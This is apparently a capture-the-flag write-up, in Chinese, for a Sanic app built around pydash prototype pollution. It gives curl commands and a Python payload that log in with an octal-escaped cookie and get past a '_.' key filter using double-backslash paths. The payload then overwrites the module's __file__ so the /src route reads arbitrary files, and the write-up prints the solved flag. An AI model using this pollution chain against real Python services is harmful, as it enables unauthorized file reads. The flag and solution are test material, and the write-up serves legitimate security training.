## 题解

### 入口与指纹

`Sanic` + `sanic_session` + `pydash`，首页 `PyDash Pollution Challenge` 只有两个链接：`/src` 和 `/flag`。

`/src` 直接把整个应用文件读出来（`return text(open(__file__).read())`），所以源码不用猜：

```python
@app.route("/login")
async def login(request):
    user = request.cookies.get("user")
    if user and user.lower() == 'adm;n':
        request.ctx.session['admin'] = True
        return text("login success")
    return text("login fail")

@app.route("/admin", methods=['GET', 'POST'])
async def admin(request):
    if request.ctx.session.get('admin') == True:
        key = request.json.get('key')
        value = request.json.get('value')
        if key and value and type(key) is str and '_.' not in key:
            pollute = Pollute()
            pydash.set_(pollute, key, value)
            return text("success")
        return text("forbidden")
    return text("forbidden")

@app.route("/flag")
async def flag(request):
    if request.ctx.session.get('admin') == True:
        return text("Find the flag! Hint: Check /src and use pollution")
    return text("login first", status=403)
```

三个关键点：

1. `user.lower() == 'adm;n'` —— 分号是 Cookie 的分隔符，不能直接发。
2. `'_.' not in key` —— 只挡「下划线紧跟点」这一种写法。
3. `pydash.set_(pollute, key, value)` —— 值只能是字符串（JSON），所以要找「污染后能让现有代码读文件」的全局变量。

### 关键观察

**1. Cookie 八进制编码绕过（第一段）。**

直接发 `Cookie: user=adm;n` 会被解析成两个 cookie（`user=adm` 和 `n`），登录失败。Python 的 `SimpleCookie` 支持**八进制转义**，但只对带引号的值生效：

```python
SimpleCookie('user=adm\\073n')      # {}       （无引号不解析）
SimpleCookie('user="adm\\073n"')    # {'user': 'adm;n'}   ✅
```

所以要用 `Cookie: user="adm\073n"`。登录成功后服务端下发 `session=<id>`。

**2. pydash 的路径分隔符可以被反斜杠改写（第二段）。**

`pydash.to_path` 用这个正则切分：

```
(?<!\\)(?:\\\\)*\.|(\[\d+\])
```

- `\.`（一个反斜杠）→ 点被转义，**不**切分，`a\.b` 变成单个 key `a.b`。
- `\\.`（两个反斜杠）→ 反斜杠对被消耗掉，点**仍然切分**，且切出的段名不含反斜杠。

于是 `__class__\\.__init__\\.__globals__` 既满足「原始串里没有 `_.`」，又会被解析成 `['__class__', '__init__', '__globals__']`。

验证：

```python
pydash.to_path('__class__\\\\.__init__\\\\.__globals__\\\\.__file__')
# ['__class__', '__init__', '__globals__', '__file__']
'_.' in '__class__\\\\.__init__'      # False
```

**3. `/src` 读的是模块全局的 `__file__`（第三段）。**

```python
@app.route("/src")
async def src(request):
    return text(open(__file__).read())
```

`__file__` 是模块级名字。`Pollute.__init__.__globals__` 就是同一个模块的 globals 字典，把 `__file__` 改成别的路径，`/src` 就会读那个文件——**不需要 RCE，也不需要替换 `open`**。

### 利用链

**Step 1：八进制 Cookie 登录。**

```bash
T=10.0.0.0   # 本例地址已失效
curl -s -c cj -H 'Cookie: user="adm\073n"' "http://$T/login"
# login success
# Set-Cookie: session=83744db7...

curl -s -b cj "http://$T/flag"
# Find the flag! Hint: Check /src and use pollution
```

**Step 2：用双反斜杠路径污染 `__file__`。**

```bash
python3 - <<'PY' > body.json
import json
k = '__class__' + '\\\\' + '.__init__' + '\\\\' + '.__globals__' + '\\\\' + '.__file__'
print(json.dumps({'key': k, 'value': '/etc/hostname'}))
PY

curl -s -b cj -H 'Content-Type: application/json' -d @body.json "http://$T/admin"
# success

curl -s -b cj "http://$T/src"
# b1bcc8936f09     ← 变成 /etc/hostname 的内容
```

**Step 3：把 `__file__` 指向 flag 文件。**

```bash
# 同样的请求，只换 value
#   /etc/hostname → /challenge/flag.txt
curl -s -b cj "http://$T/src"
# flag{fdd7004b-f181-422b-bb14-5fe186459662}
```

注意：路径不存在时 `/src` 返回 500（`open` 抛异常），所以「500」和「200 + 内容」可以直接当存在性判据。

### 复盘

- **`/src` 这种「打印自己的源码」的路由要当成白盒。** 它既给出漏洞点，也给出过滤器边界。
- **Cookie 里不能出现分号，但 SimpleCookie 支持八进制转义（且只在带引号时生效）。** `user="adm\073n"` 是标准写法。
- **过滤 `_.` 挡不住 dunder 链。** pydash 的路径正则会消耗成对的反斜杠，`\\.` 既不是 `_.` 又能切分，是本例的核心绕过。
- **污染的落点要选「现有代码会去读的全局名」。** 本例不是去替换 `open`（值只能是字符串，替换了也调用不了），而是改 `__file__`——`/src` 本来就用它做文件路径。
- **文件不存在 → 500，存在 → 200 + 内容**，这是判断路径是否正确的现成 oracle。
